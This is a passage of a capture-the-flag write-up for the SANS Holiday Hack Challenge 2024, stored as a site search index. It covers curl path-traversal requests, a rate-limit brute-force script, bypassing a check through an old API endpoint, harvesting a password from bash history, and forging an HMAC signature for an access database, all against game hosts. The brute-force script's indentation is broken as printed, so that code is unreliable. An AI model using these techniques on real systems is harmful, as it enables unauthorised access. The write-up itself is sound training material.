{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"SANS Holiday Hack Challenge 2024 Write-Up","text":"<p>This is a complete write-up for the SANS Holiday Hack Challenge 2024. This is a yearly capture-the-flag event organized by the SANS training institute around the holiday period. It is free of charge and played in form of an online multiplayer rpg-like game including a world to walk around freely in where you can meet your peers, NPCs with dialogue, and a storyline, making it a unique CTF.</p> <p>Submission results</p> <p>My entry was selected as one of the 'Super Honorable Mentions' for 2024! More details can be found here.</p> <p></p> <p>Multiplayer world to roam around in.</p>"},{"location":"#challenge-topics-2024","title":"Challenge topics 2024","text":"<ul> <li>Ransomware Reverse Engineering</li> <li>Hardware Hacking</li> <li>Web App Hacking with MQTT and Video Feed Manipulation</li> <li>Video Game Hacking</li> <li>Threat Hunting with KQL</li> <li>SIM/SEM Analysis</li> <li>Mobile App Penetration Testing</li> <li>OSINT via Drone Path Analysis</li> <li>Web Exploration with cURL</li> <li>PowerShell for Cyber Defense</li> </ul>"},{"location":"#personal-note","title":"Personal note","text":"<p>This is the first time I have written a write-up for a CTF, and the second time completing the SANS Holiday Hack Challenge after tackling it in 2022. I have thoroughly enjoyed the creativity and effort put into each challenge and highly appreciate this being available for free. I also want to shoutout the awesome community on Discord that supported me with nudges when I needed them the most!</p> <p>Besides practicing my CTF skills, this write-up has also allowed me to gain experience with Github pages and MKDocs Material, two technologies that I have been wanting to experiment with. I have also opted to test ChatGPT more in depth using their premium offering for a month and learn more about writing effective prompts (more information below). All-in-all, this has been a pleasure to work on!</p>"},{"location":"#write-up-information","title":"Write-up information","text":"<p>I have attempted to extract the maximum value of MKDocs Material during writing. You will see structured pages following a consistent design language. Some special features have been used for better readability and clarity:</p>"},{"location":"#admonitions","title":"Admonitions","text":"<p>These have been of great help to call-out side content without interrupting the document flow. You will see various types, with some being collapsed by default.</p> <p>Note</p> <p>Simple note highlighting some information.</p> <p>Objective</p> <p>Objectives will be shown in a question box.</p> <p>Hint</p> <p>Hints provided by the CTF will be shown in a tip box. They will include highlighted text to show what part of the hint triggers me as 'important'.</p> <p>Conversation</p> <p>Character conversations will be shown in a quote box. They will include highlighted text to show what part of the conversation triggers me as 'important'.</p> <p>Answer</p> <p>Final challenge answers will be given in an answer box.</p> <p>AI usage</p> <p>All usage of AI will be highlighted using a special call-out box with the aim to create a better understanding of how it has contributed to the result.</p>"},{"location":"#answer-structure","title":"Answer structure","text":"<p>SANS has added a silver and a gold achievement for every challenge to make it possible to progress in the story without having to complete every challenge on the hardest level (gold). To make a distinction between these versions of the challenge in the write-up, the solutions have tabs to separate the answers:</p> SilverGold <p>Solution for the silver achievement.</p> <p>Solution for the gold achievement.</p>"},{"location":"#code-blocks","title":"Code blocks","text":"Code blocks<pre><code>Where possible, code blocks will be used to clearly denote code, commands, or other challenge artifacts.\nWhen there are lines that are of importance, they will be highlighted like this one.\nWhen there is more to share, annotations will be used, like here. # (1)!\n</code></pre> <ol> <li>They will contain more information.</li> </ol>"},{"location":"#conclusion-with-santa","title":"Conclusion with Santa","text":"<p>Santa</p> <p>I thought the holidays were truly lost this year. I am so thankful you were here to right the wrongs of my misguided elves. I will ensure they never jeopardize the holidays again. This is the kind of behavior I expect from Jack Frost and his Trolls, not the elves.</p> <p>But, I suppose I have fault in this as well, since it's the first time I've been away at the start of the season, and after last year's unconventional holidays.</p> <p>Plus, I didn't inform the elves ahead of time. Quite the lesson learned on my part. Even the best of us can always improve.</p> <p>I know each faction had the best interest of the holidays at heart, even if their methods were misguided. It's important to have empathy and forgiveness, especially during the holidays.</p> <p>After all, the greatest gift we give AND receive is time spent with loved ones. Never forget that!</p> <p>Now let's put all this behind us and be merry. Until next year! Happy Holidays!</p> <p></p>"},{"location":"act_1/cURLing/","title":"cURLing","text":"<p>Difficulty: </p>"},{"location":"act_1/cURLing/#objective","title":"Objective","text":"<p>Task description</p> <p>Team up with Bow Ninecandle to send web requests from the command line using Curl, learning how to interact directly with web servers and retrieve information like a pro!</p> Bow Ninecandle <p>Well hello there! I'm Bow Ninecandle, bright as a twinkling star! Everyone's busy unpacking, but I've grown quite bored of that. Care to join me for a lovely game?</p> <p>Oh Joy! Today, We're diving into something delightful: the curling challenge\u2014without any ice, but plenty of sparkle!</p> <p>No icy brooms here though! We're all about Curl, sending web requests from the command line like magic messages.</p> <p>So, have you ever wielded Curl before? If not, no worries at all, my friend!</p> <p>It's this clever little tool that lets you whisper directly to web servers. Pretty neat, right?</p> <p>Think of it like sending secret scrolls through the interwebs, awaiting a wise reply!</p> <p>To begin, you can type something like curl https://example.com. Voil\u00e0! The HTML of the page appears, like conjuring a spell!</p> <p>Simple enough, huh? But oh, there's a whole world of magic you can cast with Curl!</p> <p>We're just brushing the surface here, but trust me\u2014it\u2019s a hoot and a half!</p> <p>If you get tangled up or need help, just give me a shout! I\u2019m here to help you ace this curling spectacle.</p> <p>So, are you ready to curl those web requests like a pro? Let\u2019s see your magic unfold!</p>"},{"location":"act_1/cURLing/#hints","title":"Hints","text":"cURL Manual <p>The official cURL man page has tons of useful information on how to use cURL.</p> cURL: Don't squash <p>Take a look at cURL's \"--path-as-is\" option; it controls a default behavior that you may not expect!</p>"},{"location":"act_1/cURLing/#solution","title":"Solution","text":"SilverGold <p>This challenge presents us a terminal to experiment with using the command line tool 'curl'. It tasks us to formulate the correct curl command with various goals. We will tackle this using the curl manual that can be opened with <code>man curl</code> or using the webpage as linked by the hint.</p> Solution for question 1 <p>Task</p> <p>Unlike the defined standards of a curling sheet, embedded devices often have web servers on non-standard ports. Use curl to retrieve the web page on host \"curlingfun\" port 8080. If you need help, run the 'hint' command.</p> <p>We can simply add the port in the URL:</p> <pre><code>curl http://curlingfun:8080\n</code></pre> Solution for question 2 <p>Task</p> <p>Embedded devices often use self-signed certificates, where your browser will not trust the certificate presented. Use curl to retrieve the TLS-protected web page at https://curlingfun:9090/</p> <p>Our first intuition should be to change to HTTPS. However, this gives us the following error:</p> <p>Failure</p> <pre><code>curl: (60) SSL certificate problem: self-signed certificate\nMore details here: https://curl.se/docs/sslcerts.html\n\ncurl failed to verify the legitimacy of the server and therefore could not\nestablish a secure connection to it. To learn more about this situation and\nhow to fix it, please visit the web page mentioned above.\n</code></pre> <p>We need to instruct curl to trust the self-signed certificate. The is the -k flag that lets curl skip the verification step. We can then send our request to the webbpage:</p> <pre><code>curl -k https://curlingfun:9090/\n</code></pre> Solution for question 3 <p>Task</p> <p>Working with APIs and embedded devices often requires making HTTP POST requests. Use curl to send a request to https://curlingfun:9090/ with the parameter \"skip\" set to the value \"alabaster\", declaring Alabaster as the team captain.</p> <p>We can use the -X flag to choose the type of HTTP request we are making and the -d flag to include data:</p> <pre><code>curl -k -X POST https://curlingfun:9090/ -d \"skip=alabaster\"\n</code></pre> Solution for question 4 <p>Task</p> <p>Working with APIs and embedded devices often requires maintaining session state by passing a cookie. Use curl to send a request to https://curlingfun:9090/ with a cookie called \"end\" with the value \"3\", indicating we're on the third end of the curling match.</p> <p>We can use the -b flag to include a cookie in our request:</p> <pre><code>curl -k -b \"end=3\" https://curlingfun:9090/\n</code></pre> Solution for question 5 <p>Task</p> <p>Working with APIs and embedded devices sometimes requires working with raw HTTP headers. Use curl to view the HTTP headers returned by a request to https://curlingfun:9090/</p> <p>We can use the -v flag to make our request verbose:</p> <pre><code>curl -k -v https://curlingfun:9090/\n</code></pre> Solution for question 6 <p>Task</p> <p>Working with APIs and embedded devices sometimes requires working with custom HTTP headers. Use curl to send a request to https://curlingfun:9090/ with an HTTP header called \"Stone\" and the value \"Granite\".</p> <p>We can use the -H flag to add a custom header to our request:</p> <pre><code>curl -H 'Stone: Granite' -k https://curlingfun:9090//\n</code></pre> Solution for question 7 <p>Task</p> <p>curl will modify your URL unless you tell it not to. For example, use curl to retrieve the following URL containing special characters: https://curlingfun:9090/../../etc/hacks</p> <p>The task description tells us that apparently curl modifies requests sometimes. When requesting this URL, curl will change it to the following</p> <pre><code>GET /etc/hacks HTTP/1.1\n</code></pre> <p>To prevent this from happening, we use our second hint and add the --path-as-is flag:</p> <pre><code>curl -k --path-as-is https://curlingfun:9090/../../etc/hacks\n</code></pre> <p>This will grant us the silver achievement.</p> <p>To get started with gold, we need to find our instructions first. We find them in Alabaster's home folder in \"HARD-MODE.txt\":</p> <pre><code>alabaster@curlingfun:~$ ls\nHARD-MODE.txt  HELP\n</code></pre> Solution for question 1 <p>Task</p> <pre><code>alabaster@curlingfun:~$ cat HARD-MODE.txt\nPrefer to skip ahead without guidance? Use curl to craft a request meeting these requirements:\n\n- HTTP POST request to https://curlingfun:9090/\n- Parameter \"skip\" set to \"bow\"\n- Cookie \"end\" set to \"10\"\n- Header \"Hack\" set to \"12ft\"\n</code></pre> <p>We need to combine some of the knowledge we just learned:</p> <pre><code>curl -X POST -k --cookie \"end=10\" -d \"skip=bow\" -H \"Hack: 12ft\" https://curlingfun:9090/\n</code></pre> Solution for question 2 <p>Task</p> <p>Excellent! Now, use curl to access this URL: https://curlingfun:9090/../../etc/button</p> <p>This task is similar to question 7 for the silver achievement:</p> <pre><code>curl -k --path-as-is https://curlingfun:9090/../../etc/button\n</code></pre> Solution for question 3 <p>Task</p> <p>Great! Finally, use curl to access the page that this URL redirects to: https://curlingfun:9090/GoodSportsmanship</p> <p>We need to instruct curl to follow any new locations of pages the server provides us (with HTTP 3XX codes). We use the -L flag:</p> <pre><code>curl -k -L https://curlingfun:9090/GoodSportsmanship\n</code></pre> <p>This will grant us the gold achievement.</p>"},{"location":"act_1/cURLing/#images","title":"Images","text":""},{"location":"act_1/cURLing/#response","title":"Response","text":"<p>Bow Ninecandle</p> <p>Bravo! Look at you, curling through that like a true web wizard!</p> <p>You zipped through that challenge faster than a curling stone on enchanted ice!</p> <p>Wait... did you just slice and dice it all into three commands? My stars, you're a Curling conjurer!</p>"},{"location":"act_1/frosty_keypad/","title":"Frosty Keypad","text":"<p>Difficulty: </p>"},{"location":"act_1/frosty_keypad/#objective","title":"Objective","text":"<p>Task description</p> <p>In a swirl of shredded paper, lies the key. Can you unlock the shredder\u2019s code and uncover Santa's lost secrets?</p> Morcel Nougat <p>Hello again! I'm Morcel Nougat, dashing around like a reindeer on a sugar rush! We've got a bit of a dilemma, and I could really use your expertise.</p> <p>Wombley and Alabaster have taken charge now that Santa\u2019s gone missing, and We're scrambling to get the Wish List secured. But... one of the elves in the Data Management Team got overzealous, and the Shredder McShreddin 9000 gobbled up a crucial document we need to access Santa's chest!</p> <p>It\u2019s our golden ticket to getting Santa\u2019s Little Helper tool working properly. Without it, the hardware hack we're planning is as empty as Santa\u2019s sleigh in January.</p> <p>Think you can help? I can get you into the Shredder McShreddin 9000\u2019s inner workings to retrieve the pieces, but there are two access codes involved. One of the elves left a hint, but it\u2019s all a blur to me!</p> <p>I've noticed that some elves keep referring to a certain book when they walk by. I bet it has the answers we need to crack the code and recover the document!</p> <p>You know, some of the elves always have their noses in the same book when they pass by here. Maybe it\u2019s got the clues we need to crack the code?</p>"},{"location":"act_1/frosty_keypad/#hints","title":"Hints","text":"Who Are You Calling a Dorf? <p>Hmmmm. I know I have seen Santa and the other elves use this keypad. I wonder what it contains. I bet whatever is in there is a National Treasure!</p> Just Some Light Reading <p>See if you can find a copy of that book everyone seems to be reading these days. I thought I saw somebody drop one close by...</p> Shine Some Light on It <p>Well this is puzzling. I wonder if Santa has a seperate code. Bet that would cast some light on the problem. I know this is a stretch...but...what if you had one of those fancy UV lights to look at the fingerprints on the keypad? That might at least limit the possible digits being used...</p>"},{"location":"act_1/frosty_keypad/#solution","title":"Solution","text":"SilverGold <p>The conversation with Morcel and the hints give us quite some information to start analyzing this problem with. Checking the keypad, we see we can input the digits zero to nine.</p> <p></p> <p>A standard keypad with maximum input lengh of five.</p> <p>There is an input length limit of five. In the top left corner we find the hint the elves left for us. It contains five number combinations:</p> <p></p> <p>The hint provided by the elves.</p> <p>We likely need the book to use this hint. We walk around and find the book:</p> <p></p> <p>The book is located behind this box.</p> <p>The book is now part of our inventory under 'items'. It redirects us to this website to display the book:</p> <p></p> <p>The Frosty Book.</p> <p>Let's put the information available to us together. The hints refer to \"National Treasure\". This is a movie in which the plot includes the usage of a book cipher, also known as an \"Ottendorf cipher\". These ciphers replace plaintext with some code that locates it in another text. These codes are often numbers that indicate book page, line, and word occurence. Using the book, the codes the elves gave us, and the cipher key logic \"page:word:letter\", we find the following plaintext:</p> Code Plaintext <code>2:6:1</code> S <code>4:19:3</code> A <code>6:1:1</code> N <code>3:10:4</code> T <code>14:8:3</code> A <p>We find the word 'SANTA'! However, we will need to convert this to numbers somehow. In the past, keypads were also used to write text on phones with Multi-tap. Every digit would represent some letters and multiple presses would let you cycle through them. In this case, we can only submit five digits and we would need more presses to use this system. There is also T9 dialing which allows words to be formed with single key presses using a predictive system. We can use this website to encode our plaintext and find the digit combination that would give us this text:</p> <p>Answer</p> <p><code>72682</code> will translate into 'santa'.</p> <p>Morcel gives us some additional hints when we talk to him after getting the silver achievement:</p> <p>Morcel Nougat</p> <p>WOW, you did it! You know, they say Ottendorf ciphers were used back in the Frosty Archives crisis\u2026 or was that during the Jack Frost incident? Either way, you're amazing!</p> <p>But wait\u2014there\u2019s still one more code tucked away! This one might need a bit more elbow grease\u2026 you may need to try a few combinations to crack it!</p> <p>The conversation suggests that we need to brute-force our way in to find a second code. Our unused hints also tell us we can find a flashlight somewhere. We find it behind these boxes:</p> <p></p> <p>The flashlight is located behind these boxes.</p> <p>We can then illuminate the keypad and see fingerprints on some keys, giving us an indication of which ones are used:</p> <p></p> <p>The flashlight shows us which keys are used.</p> <p>We find that the following digits are used: <code>26786</code>. In the DevTools we see the following request being made when we submit a code:</p> <p></p> <p>The request made when submitting a code.</p> <p>Based on this information we can use the following Python script to find the code:</p> Brute-force Python script<pre><code>import itertools\nimport requests\nimport time\n\n# List of digits\ndigits = '26786'\n\n# Generate all combinations of the digits (with repetition allowed)\ncombinations = itertools.product(digits, repeat=len(digits))\n\n# Define the URL (you can modify this)\nurl = '&lt;YOUR_URL_HERE&gt;'\n\n# Iterate over all combinations\nfor combination in combinations: # Convert tuple to string\n    answer = ''.join(combination)\n\n# Prepare payload\npayload = {\"answer\": answer}\n\n# Send POST request (you can modify this to a GET if needed)\nresponse = requests.post(url, json=payload)\n\n# Print request and complete response message\nprint(f\"Sent: {payload}\")\nprint(f\"Response Status Code: {response.status_code}\")\nprint(f\"Response Message: {response.text}\\n\")\n\n# Delay for 1 second between requests\ntime.sleep(1)\n</code></pre> <p>AI usage</p> <p>ChatGPT was used to quickly generate this code. The following set of prompts was used to get to the solution:</p> Prompts <p>Provide me a Python script that will iterate over all combinations of the digits '26786' and use it as a parameter in a request payload in the format \"{answer: }\". Let me add the URL to submit this request to myself. <p>Show me the complete response message as well.</p> <p>Add a one second delay between every request.</p> <p>Allow digits to appear twice in the combinations.</p> <p>Running this script, we will eventually find the following code:</p> Answer <pre><code>Sent: {'answer': '22786'}\nResponse Status Code: 200\nResponse Message: {\"output\":\"success\"}\n</code></pre>"},{"location":"act_1/frosty_keypad/#response","title":"Response","text":"<p>Morcel Nougat</p> <p>WOW, you did it! You know, they say Ottendorf ciphers were used back in the Frosty Archives crisis\u2026 or was that during the Jack Frost incident? Either way, you're amazing!</p> <p>But wait\u2014there\u2019s still one more code tucked away! This one might need a bit more elbow grease\u2026 you may need to try a few combinations to crack it!</p> <p>Unbelievable! You found a flaw in the system and completely bypassed the rate limiter. You\u2019re practically an elf legend!</p> <p>Incredible work! You pieced together the code like a true sleuth and retrieved the shreds we need. I\u2019m not quite sure how you\u2019ll put them all together, but if anyone can, it\u2019s you!</p> <p>Your help has been absolutely essential, especially now with Santa missing. Wombley and Alabaster will want to hear all about it\u2014go share the news with Jewel Loggins!</p>"},{"location":"act_1/hardware_hacking_101/","title":"Hardware Hacking 101","text":"<p>Difficulty: </p>"},{"location":"act_1/hardware_hacking_101/#objective","title":"Objective","text":"<p>Task description</p> <p>Ready your tools and sharpen your wits\u2014only the cleverest can untangle the wires and unlock Santa\u2019s hidden secrets!</p> <p>Part 1</p> <p>Jingle all the wires and connect to Santa's Little Helper to reveal the merry secrets locked in his chest!</p> <p>Part 2</p> <p>Santa\u2019s gone missing, and the only way to track him is by accessing the Wish List in his chest\u2014modify the access_cards database to gain entry!</p> Jewel Loggins <p>Hello there! I\u2019m Jewel Loggins.</p> <p>I hate to trouble you, but I really need some help. Santa\u2019s Little Helper tool isn\u2019t working, and normally, Santa takes care of this\u2026 but with him missing, it\u2019s all on me.</p> <p>I need to connect to the UART interface to get things running, but it\u2019s like the device just refuses to respond every time I try.</p> <p>I've got all the right tools, but I must be overlooking something important. I've seen a few elves with similar setups, but everyone\u2019s so busy preparing for Santa\u2019s absence.</p> <p>If you could guide me through the connection process, I\u2019d be beyond grateful. It\u2019s critical because this interface controls access to our North Pole access cards!</p> <p>We used to have a note with the serial settings, but apparently, one of Wombley\u2019s elves shredded it! You might want to check with Morcel Nougat\u2014he might have a way to recover it.</p>"},{"location":"act_1/hardware_hacking_101/#part-1","title":"Part 1","text":""},{"location":"act_1/hardware_hacking_101/#hints","title":"Hints","text":"On the Cutting Edge <p>Hey, I just caught wind of this neat way to piece back shredded paper! It's a fancy heuristic detection technique\u2014sharp as an elf\u2019s wit, I tell ya! Got a sample Python script right here, courtesy of Arnydo. Check it out when you have a sec: heuristic_edge_detection.py.\"</p> Shredded to Pieces <p>Have you ever wondered how elves manage to dispose of their sensitive documents? Turns out, they use this fancy shredder that is quite the marvel of engineering. It slices, it dices, it makes the paper practically disintegrate into a thousand tiny pieces. Perhaps, just perhaps, we could reassemble the pieces?</p>"},{"location":"act_1/hardware_hacking_101/#solution","title":"Solution","text":"SilverGold <p>The challenge presents us the following:</p> <p></p> <p>Challenge overview with a manual in the top right. We see two pieces of hardware, an UART-bridge, and some cables. We can drag and drop some of these items.</p> <p>We can drag and drop the wires and switch some settings on the hardware. Following the manual and using some of our common hardware knowledge, we take the following steps:</p> <ul> <li> Connect the wires to the hardware and UART-bridge as follows: <code>G &lt;-&gt; GND, R &lt;-&gt; TX, T &lt;-&gt; RX, V &lt;-&gt; VCC</code></li> <li> Connect the USB-C cable to the UART-bridge.</li> <li> Flip the voltage switch on the UART-bridge to '3V'.</li> <li> Power on 'Santa's Little Helper' (or 'SLH') with the green button.</li> </ul> <p>The SLH will turn on but when pressing the 'S' button to connect, we get an error. We will need the correct settings.</p> <p>The conversation with Jewel reveals that we must first work on the challenge 'Frosty Keypad' related to Morcel Nougat to get some shredded note. Once we have the item, it says the following:</p> <p>One Thousand Little Teeny Tiny Shredded Pieces of Paper</p> <p>A mountain of one thousand little tiny shredded pieces of paper\u2014each scrap whispering a secret, waiting for the right hardware hacker to piece the puzzle back together!</p> <p>The .zip archive contains a set of .png images that represent slices of the shredded paper. One of the hints gives us a Python script that should be able to piece back shredded paper. When running this script in the 'shreds' folder, we get the following image:</p> <p></p> <p>Piece of paper containing the configuration needed for the SLH.</p> <p>We flip the image over the X-axis with CyberChef and get the following settings (assuming port to be the USB):</p> <p>Answer</p> Name Setting Port USB0 Baud Rate 115200 Parity even Data 7 bits Stop bits 1 bit Flow control RTS <p></p> <p>Solution configuration.</p> <p>Jewel Loggins</p> <p>Fantastic! You managed to connect to the UART interface\u2014great work with those tricky wires! I couldn't figure it out myself\u2026</p> <p>Rumor has it you might be able to bypass the hardware altogether for the gold medal. Why not see if you can find that shortcut?</p> <p>Jewel tells us that we might be able to bypass the hardware completely. This suggests we can do something with the JavaScript code as we have seen in previous challenges as well. In the DevTools we find the following:</p> Hint contained in 'main.js'<pre><code>async function checkit(serial, uV) {\n    //..\n    // Build the URL with the request ID as a query parameter\n    // Word on the wire is that some resourceful elves managed to brute-force their way in through the v1 API.\n    // We have since updated the API to v2 and v1 \"should\" be removed by now.\n    // const url = new URL(`${window.location.protocol}//${window.location.hostname}:${window.location.port}/api/v1/complete`);\n    const url = new URL(`${window.location.protocol}//${window.location.hostname}:${window.location.port}/api/v2/complete`);\n    //..\n}\n</code></pre> <p>Answer</p> <p>We use Burp to capture our final request for the silver achievement. Then we simply change the endpoint to the v1 API using the repeater and receive the gold achievement. We don't need to brute-force it this way, even though that might be the intended path to the solution. We could have brute-forced it with the Burp intruder.</p> <p>Example request: <pre><code>POST /api/v1/complete HTTP/2\nHost: hhc24-hardwarehacking.holidayhackchallenge.com\nCookie: _ga=&lt;FILL_IN&gt;; _ga_F6ZZNPR5E5=&lt;FILL_IN&gt;; GCLB=\"&lt;FILL_IN&gt;\"\nContent-Type: application/json\nAccept: */*\nAccept-Encoding: gzip, deflate, br\n\n{\"requestID\":\"&lt;YOUR_REQUEST_ID&gt;\",\"serial\":[3,9,2,2,0,3],\"voltage\":3}\n</code></pre></p>"},{"location":"act_1/hardware_hacking_101/#part-2","title":"Part 2","text":"<p>Jewel provides some more information:</p> <p>Jewel Loggins</p> <p>Next, we need to access the terminal and modify the access database. We're looking to grant access to card number 42.</p> <p>Start by using the slh application\u2014that\u2019s the key to getting into the access database. Problem is, the \u2018slh\u2019 tool is password-protected, so we need to find it first.</p> <p>Search the terminal thoroughly; passwords sometimes get left out in the open.</p>"},{"location":"act_1/hardware_hacking_101/#hints_1","title":"Hints","text":"It's In the Signature <p>I seem to remember there being a handy HMAC generator included in CyberChef.</p> Hidden in Plain Sight <p>It is so important to keep sensitive data like passwords secure. Often times, when typing passwords into a CLI (Command Line Interface) they get added to log files and other easy to access locations. It makes it trivial to step back in history and identify the password.</p>"},{"location":"act_1/hardware_hacking_101/#solution_1","title":"Solution","text":"SilverGold <p>The hints suggest us to look into the bash history of the terminal. We boot the system the default way and check the logfile:</p> <p></p> <p>The password is present in the bash history.</p> <p>With the password, we can then modify the permissions of card 42 using the SLH app. We look into the functionality:</p> <pre><code>slh@slhconsole\\&gt; slh --help\nusage: slh [-h] [--view-config] [--view-cards] [--view-card ID] [--set-access ACCESS_LEVEL]\n        [--id ID] [--passcode PASSCODE] [--new-card]\n\nSanta's Little Helper - Access Card Maintenance Tool\n\noptions:\n-h, --help            show this help message and exit\n--view-config         View current configuration.\n--view-cards          View current values of all access cards.\n--view-card ID        View a single access card by ID.\n--set-access ACCESS_LEVEL\n                        Set access level of access card. Must be 0 (No Access) or 1 (Full\n                        Access).\n--id ID               ID of card to modify.\n--passcode PASSCODE   Passcode to make changes.\n--new-card            Generate a new card ID.\n</code></pre> <p>Answer</p> <p><code>slh --id 42 --passcode CandyCaneCrunch77 --set-access 1</code></p> <p>Jewel Loggins</p> <p>Wow! You're amazing at this! Clever move finding the password in the command history. It\u2019s a good reminder about keeping sensitive information secure\u2026</p> <p>There\u2019s a tougher route if you're up for the challenge to earn the Gold medal. It involves directly modifying the database and generating your own HMAC signature.</p> <p>I know you can do it\u2014come back once you've cracked it!</p> <p>Jewel wants us to directly modify the database and generate our own HMAC signature. In the home folder there is an SQLite database:</p> <pre><code>slh@slhconsole\\&gt; file access_cards\naccess_cards: SQLite 3.x database, last written using SQLite version 3040001, file counter 4, database pages 32, cookie 0x2, schema 4, UTF-8, version-valid-for 4\n</code></pre> <p>SQLite 3 is installed on the system so we can open the database to learn more:</p> <pre><code>slh@slhconsole\\&gt; sqlite3 access_cards\nSQLite version 3.40.1 2022-12-28 14:03:47\nEnter \".help\" for usage hints.\nsqlite&gt; .tables\naccess_cards  config\nsqlite&gt; SELECT * FROM config\n...&gt; ;\n1|hmac_secret|9ed1515819dec61fd361d5fdabb57f41ecce1a5fe1fe263b98c0d6943b9b232e\n2|hmac_message_format|{access}{uuid}\n3|admin_password|3a40ae3f3fd57b2a4513cca783609589dbe51ce5e69739a33141c5717c20c9c1\n4|app_version|1.0\n\nsqlite&gt; SELECT * FROM access_cards WHERE ID=42;\n42|c06018b6-5e80-4395-ab71-ae5124560189|0|ecb9de15a057305e5887502d46d434c9394f5ed7ef1a51d2930ad786b02f6ffd\n\nsqlite&gt; .schema access_cards\nCREATE TABLE access_cards (\n            id INTEGER PRIMARY KEY,\n            uuid TEXT,\n            access INTEGER,\n            sig TEXT\n    );\n</code></pre> <p>In the 'config' table se see an HMAC secret (SHA256), message format, and admin password. In the 'access_cards' table we see entries for the access cards that include an ID, UUID, access level, and signature. This gives us insight into the HMAC message format that we need to create our own signature.</p> <p>Our goal is to modify the access level and signature of access card 42 in such a way that the app deems it legal.</p> <p>Fun fact: the internet tells us that the HMAC secret is a hash for the word 'pizza'. However, this is a rabbit hole as HMAC wants a fixed length input as key and uses the hashed value:</p> <p>Answer</p> <p>Use the CyberChef recipe with these values:</p> Name Value Key 9ed1515819dec61fd361d5fdabb57f41ecce1a5fe1fe263b98c0d6943b9b232e Encoding UTF8 Hashing function SHA256 Message 1c06018b6-5e80-4395-ab71-ae5124560189 <p>This gives the the signature: <code>135a32d5026c5628b1753e6c67015c0f04e26051ef7391c2552de2816b1b7096</code>:</p> <pre><code>sqlite&gt; UPDATE access_cards\nSET access = 1,\n    sig = '135a32d5026c5628b1753e6c67015c0f04e26051ef7391c2552de2816b1b7096'\nWHERE id = 42;\n</code></pre>"},{"location":"act_1/hardware_hacking_101/#response","title":"Response","text":"<p>Jewel Loggins</p> <p>Fantastic! You managed to connect to the UART interface\u2014great work with those tricky wires! I couldn't figure it out myself\u2026</p> <p>Rumor has it you might be able to bypass the hardware altogether for the gold medal. Why not see if you can find that shortcut?</p> <p>Next, we need to access the terminal and modify the access database. We're looking to grant access to card number 42.</p> <p>Start by using the slh application\u2014that\u2019s the key to getting into the access database. Problem is, the \u2018slh\u2019 tool is password-protected, so we need to find it first.</p> <p>Search the terminal thoroughly; passwords sometimes get left out in the open.</p> <p>Once you've found it, modify the entry for card number 42 to grant access. Sounds simple, right? Let\u2019s get to it!</p> <p>Wow! You're amazing at this! Clever move finding the password in the command history. It\u2019s a good reminder about keeping sensitive information secure\u2026</p> <p>There\u2019s a tougher route if you're up for the challenge to earn the Gold medal. It involves directly modifying the database and generating your own HMAC signature.</p> <p>I know you can do it\u2014come back once you've cracked it!</p> <p>Brilliant work! We now have access to\u2026 the Wish List! I couldn't have done it without you\u2014thank you so much!</p>"},{"location":"act_2/drone_path/","title":"Drone Path","text":"<p>Difficulty: </p>"},{"location":"act_2/drone_path/#objective","title":"Objective","text":"<p>Task description</p> <p>Help the elf defecting from Team Wombley get invaluable, top secret intel to Team Alabaster. Find Chimney Scissorsticks, who is hiding inside the DMZ.</p> Chimney Scissorsticks <p>Hey. Psst, over here. Hey, I'm Chimney Scissorsticks.</p> <p>I'm not liking all the tension brewing between the factions, so even though I agreed with how Wombley was handling things, I get the feeling this is going to end poorly for everyone. So I'm trying to get this data to Alabaster's side. Can you help?</p> <p>Wombley's planning something BIG in that toy factory. He's not really making toys in there. He's building an armada of drones!</p> <p>They're packed with valuable data from the elves working on the project. I think they hide the admin password in the drone flight logs. We need to crack this to prevent this escalating snowball showdown.</p> <p>You'll be working with KML files, tracking drone flight paths. Intriguing, right? We need every detail to prepare for what\u2019s ahead!</p> <p>Use tools like Google Earth and some Python scripting to decode the hidden passwords and codewords locked in those files.</p> <p>Ready to give it a go? It\u2019s going to be a wild ride, and your skills might just turn the tide of this conflict!</p>"},{"location":"act_2/drone_path/#hints","title":"Hints","text":"<p>There are no hints available.</p>"},{"location":"act_2/drone_path/#solution","title":"Solution","text":"SilverGold <p>The terminal gives us a web application. The is login functionality and a fileshare that provides us a .kml file. Even though there are no hints available, the chat with Chimney contains some. We can open this type of file in Google Earth and need to find hidden codes inside it.</p> <p></p> <p>Available .kml file on the web application.</p> <p>When we open this file in Google Earth and look above the North Pole we see the text \"GUMDROP1\" as a drawn drone path.</p> <p></p> <p>Code in the .kml file.</p> <p>Going back to the web application, we can then login using these credentials:</p> <pre><code>Username: fritjolf\nPassword: GUMDROP1\n</code></pre> <p>We now have access to some additional pages:</p> <ul> <li>A profile page with some user info.</li> <li>Elf drone workshop that can display drone details when provided a drone name.</li> <li>Admin console that needs a code to access.</li> </ul> <p>On the profile page we see this text:</p> <p><code>Note to self, remember drone name, it is the same location as secret snowball warehouses /files/secret/Preparations-drone-name.csv</code></p> <p>The path links to this page where we receive a .csv file. This .csv seems to contain some coordinate mapping in addition to a bunch of other columns. We focus on the coordinates (longtitude, latitude, height).</p> <p></p> <p>Coordinates contained in .csv file.</p> <p>We want to create a new .kml file that contains these coordinates:</p> AI usage <p>ChatGPT was used to generate a new file .kml file with these coordinates. It was provided the set and the original .kml file, and asked to replace the values. It was also asked to change the 'lookat' value to something nearby these coordinates for easy viewing.</p> New .kml file <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;kml xmlns=\"http://www.opengis.net/kml/2.2\" xmlns:gx=\"http://www.google.com/kml/ext/2.2\" xmlns:kml=\"http://www.opengis.net/kml/2.2\" xmlns:atom=\"http://www.w3.org/2005/Atom\"&gt;\n&lt;Document&gt;\n    &lt;name&gt;fritjolf-Path&lt;/name&gt;\n    &lt;gx:CascadingStyle kml:id=\"__managed_style_2398E937F13251C4AAA6\"&gt;\n        &lt;Style&gt;\n            &lt;IconStyle&gt;\n                &lt;scale&gt;1.2&lt;/scale&gt;\n                &lt;Icon&gt;\n                    &lt;href&gt;https://earth.google.com/earth/rpc/cc/icon?color=1976d2&amp;amp;id=2000&amp;amp;scale=4&lt;/href&gt;\n                &lt;/Icon&gt;\n                &lt;hotSpot x=\"64\" y=\"128\" xunits=\"pixels\" yunits=\"insetPixels\"/&gt;\n            &lt;/IconStyle&gt;\n            &lt;LabelStyle&gt;\n            &lt;/LabelStyle&gt;\n            &lt;LineStyle&gt;\n                &lt;color&gt;ff2dc0fb&lt;/color&gt;\n                &lt;width&gt;6&lt;/width&gt;\n            &lt;/LineStyle&gt;\n            